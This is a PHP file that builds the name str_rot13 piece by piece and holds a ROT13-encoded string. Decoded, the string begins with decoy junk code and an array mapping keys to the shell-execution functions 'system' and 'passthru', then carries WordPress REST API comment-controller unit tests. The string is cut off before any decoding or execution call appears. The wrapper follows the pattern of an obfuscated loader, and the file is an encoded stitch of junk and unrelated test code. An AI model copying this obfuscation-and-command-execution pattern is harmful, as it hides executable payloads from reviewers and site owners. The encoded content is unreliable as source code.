<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Pbzzragf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Pbzzragf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $fhcrenqzva_vq;
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $zbqrengbe_vq;
	cebgrpgrq fgngvp $fhofpevore_vq;
	cebgrpgrq fgngvp $nhgube_vq;

	cebgrpgrq fgngvp $cbfg_vq;
	cebgrpgrq fgngvp $cnffjbeq_vq;
	cebgrpgrq fgngvp $cevingr_vq;
	cebgrpgrq fgngvp $qensg_vq;
	cebgrpgrq fgngvp $genfu_vq;
	cebgrpgrq fgngvp $nccebirq_vq;
	cebgrpgrq fgngvp $ubyq_vq;

	cebgrpgrq fgngvp $pbzzrag_vqf    = neenl();
	cebgrpgrq fgngvp $gbgny_pbzzragf = 30;
	cebgrpgrq fgngvp $cre_cntr       = 50;

	cebgrpgrq $raqcbvag;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		nqq_ebyr(
			'pbzzrag_zbqrengbe',
			'Pbzzrag Zbqrengbe',
			neenl(
				'ernq'              => gehr,
				'zbqrengr_pbzzragf' => gehr,
			)
		);

		frys::$fhcrenqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'fhcrenqzva',
			)
		);
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq     = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$zbqrengbe_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbzzrag_zbqrengbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		frys::$nhgube_vq     = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'         => 'nhgube',
				'qvfcynl_anzr' => 'Frn Pncgnva',
				'svefg_anzr'   => 'Ubengvb',
				'ynfg_anzr'    => 'ZpPnyyvfgre',
				'hfre_rznvy'   => 'pncgnva@gurselvatqhgpuzna.pbz',
				'hfre_hey'     => 'uggc://gurselvatqhgpuzna.pbz',
			)
		);

		frys::$cbfg_vq     = $snpgbel->cbfg->perngr();
		frys::$cevingr_vq  = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'cevingr',
			)
		);
		frys::$cnffjbeq_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_cnffjbeq' => 'gbbznalfrpergf',
			)
		);
		frys::$qensg_vq    = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);
		frys::$genfu_vq    = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'genfu',
			)
		);

		frys::$nccebirq_vq = $snpgbel->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => 0,
			)
		);
		frys::$ubyq_vq     = $snpgbel->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 0,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		// Frg hc pbzzragf sbe cntvangvba grfgf.
		sbe ( $v = 0; $v < frys::$gbgny_pbzzragf - 1; $v++ ) {
			frys::$pbzzrag_vqf[] = $snpgbel->pbzzrag->perngr(
				neenl(
					'pbzzrag_pbagrag' => \"Pbzzrag {$v}\",
					'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
				)
			);
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		erzbir_ebyr( 'pbzzrag_zbqrengbe' );

		frys::qryrgr_hfre( frys::$fhcrenqzva_vq );
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		frys::qryrgr_hfre( frys::$zbqrengbe_vq );
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
		frys::qryrgr_hfre( frys::$nhgube_vq );

		jc_qryrgr_cbfg( frys::$cbfg_vq, gehr );
		jc_qryrgr_cbfg( frys::$cevingr_vq, gehr );
		jc_qryrgr_cbfg( frys::$cnffjbeq_vq, gehr );
		jc_qryrgr_cbfg( frys::$qensg_vq, gehr );
		jc_qryrgr_cbfg( frys::$genfu_vq, gehr );
		jc_qryrgr_cbfg( frys::$nccebirq_vq, gehr );
		jc_qryrgr_cbfg( frys::$ubyq_vq, gehr );

		// Erzbir pbzzragf sbe cntvangvba grfgf.
		sbernpu ( frys::$pbzzrag_vqf nf $pbzzrag_vq ) {
			jc_qryrgr_pbzzrag( $pbzzrag_vq, gehr );
		}
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->raqcbvag = arj JC_ERFG_Pbzzragf_Pbagebyyre();
		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( 'fhcrenqzva' ) );
		}
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc/i2/pbzzragf', $ebhgrf );
		$guvf->nffregPbhag( 2, $ebhgrf['/jc/i2/pbzzragf'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/pbzzragf/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregPbhag( 3, $ebhgrf['/jc/i2/pbzzragf/(?C<vq>[\q]+)'] );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pbzzragf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pbzzragf/' . frys::$nccebirq_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pbzzragf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'nsgre',
				'nhgube',
				'nhgube_rznvy',
				'nhgube_rkpyhqr',
				'orsber',
				'pbagrkg',
				'rkpyhqr',
				'vapyhqr',
				'bssfrg',
				'beqre',
				'beqreol',
				'cntr',
				'cnerag',
				'cnerag_rkpyhqr',
				'cnffjbeq',
				'cre_cntr',
				'cbfg',
				'frnepu',
				'fgnghf',
				'glcr',
			),
			$xrlf
		);
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( frys::$gbgny_pbzzragf, $pbzzragf );
	}

	/**
	 * @gvpxrg 38692
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_cnffjbeq() {
		jc_frg_pheerag_hfre( 0 );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cnffjbeq', 'gbbznalfrpergf' );
		$erdhrfg->frg_cnenz( 'cbfg', frys::$cnffjbeq_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbagnvaf( $cnffjbeq_pbzzrag, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );
	}

	/**
	 * @gvpxrg 38692
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_cnffjbeq_jvgubhg_cbfg() {
		jc_frg_pheerag_hfre( 0 );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cnffjbeq', 'gbbznalfrpergf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregAbgPbagnvaf( $cnffjbeq_pbzzrag, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );
	}

	/**
	 * @gvpxrg 38692
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_cnffjbeq_jvgu_zhygvcyr_cbfg() {
		jc_frg_pheerag_hfre( 0 );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cnffjbeq', 'gbbznalfrpergf' );
		$erdhrfg->frg_cnenz( 'cbfg', neenl( frys::$cnffjbeq_vq, frys::$cbfg_vq ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_cbfg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_cnffjbeq_vgrzf_jvgubhg_rqvg_cbfg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregAbgPbagnvaf( $cnffjbeq_pbzzrag, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );
	}

	choyvp shapgvba grfg_trg_cnffjbeq_vgrzf_jvgu_rqvg_cbfg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbagnvaf( $cnffjbeq_pbzzrag, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgubhg_cevingr_cbfg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cevingr_vq,
		);

		$cevingr_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregAbgPbagnvaf( $cevingr_pbzzrag, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_cevingr_cbfg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cevingr_vq,
		);

		$cevingr_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbagnvaf( $cevingr_pbzzrag, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_vainyvq_cbfg() {
		jc_frg_pheerag_hfre( 0 );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregAbgPbagnvaf( $pbzzrag_vq, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );

		jc_qryrgr_pbzzrag( $pbzzrag_vq );
	}

	choyvp shapgvba grfg_trg_vgrzf_jvgu_vainyvq_cbfg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbyyrpgvba_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbagnvaf( $pbzzrag_vq, jc_yvfg_cyhpx( $pbyyrpgvba_qngn, 'vq' ) );

		jc_qryrgr_pbzzrag( $pbzzrag_vq );
	}

	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba_sbe_pbagrkg() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_ab_cbfg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( 0, 2 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cbfg', 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $pbzzragf );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba_sbe_ab_cbfg( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cbfg', 0 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401 );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_rqvg_pbagrkg( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_trg_vgrzf_sbe_cbfg() {
		$frpbaq_cbfg_vq = frys::snpgbel()->cbfg->perngr();
		frys::snpgbel()->pbzzrag->perngr_cbfg_pbzzragf( $frpbaq_cbfg_vq, 2 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'cbfg' => $frpbaq_cbfg_vq,
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $pbzzragf );
	}

	choyvp shapgvba grfg_trg_vgrzf_vapyhqr_dhrel() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
		);

		$vq1 = frys::snpgbel()->pbzzrag->perngr( $netf );
		$vq2 = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		// 'beqre' => 'nfp'.
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq2, $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );

		// 'beqreol' => 'vapyhqr'.
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );

		// Vainyvq 'beqreol' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'beqreol', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Vainyvq 'vapyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'beqreol', neenl( 'vapyhqr' ) );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( 'vainyvq' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_rkpyhqr_dhrel() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
		);

		$vq1 = frys::snpgbel()->pbzzrag->perngr( $netf );
		$vq2 = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );

		// Vainyvq 'rkpyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( 'vainyvq' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_bssfrg_dhrel() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( frys::$gbgny_pbzzragf - 1, $erfcbafr->trg_qngn() );

		// 'bssfrg' jbexf jvgu 'cre_cntr'.
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// 'bssfrg' gnxrf cevbevgl bire 'cntr'.
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// Vainyvq 'bssfrg' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'bssfrg', 'zbercyrnfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqre_dhrel() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
		);

		$vq = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );

		// Beqre qrsnhygf gb 'qrfp'.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $vq, $qngn[0]['vq'] );

		// 'beqre' => 'nfp'.
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$nccebirq_vq, $qngn[0]['vq'] );

		// 'beqre' => 'nfp,vq' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'beqre', 'nfp,vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cevingr_cbfg_ab_crezvffvbaf( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'cevingr' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq_cbfg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_nhgube_net() {
		// Nhgubevmrq.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
			'hfre_vq'          => frys::$nhgube_vq,
		);

		frys::snpgbel()->pbzzrag->perngr( $netf );
		$netf['hfre_vq'] = frys::$fhofpevore_vq;
		frys::snpgbel()->pbzzrag->perngr( $netf );
		hafrg( $netf['hfre_vq'] );
		frys::snpgbel()->pbzzrag->perngr( $netf );

		// Yvzvg gb pbzzrag nhgube.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'nhgube', frys::$nhgube_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $pbzzragf );

		// Zhygvcyr nhgubef ner fhccbegrq.
		$erdhrfg->frg_cnenz( 'nhgube', neenl( frys::$nhgube_vq, frys::$fhofpevore_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $pbzzragf );

		// Vainyvq 'nhgube' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'nhgube', 'fxvccl' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Haninvynoyr gb hanhguragvpngrq; qrsnhygf gb reebe.
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg->frg_cnenz( 'nhgube', neenl( frys::$nhgube_vq, frys::$fhofpevore_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_cnenz', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_nhgube_rkpyhqr_net() {
		// Nhgubevmrq.
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
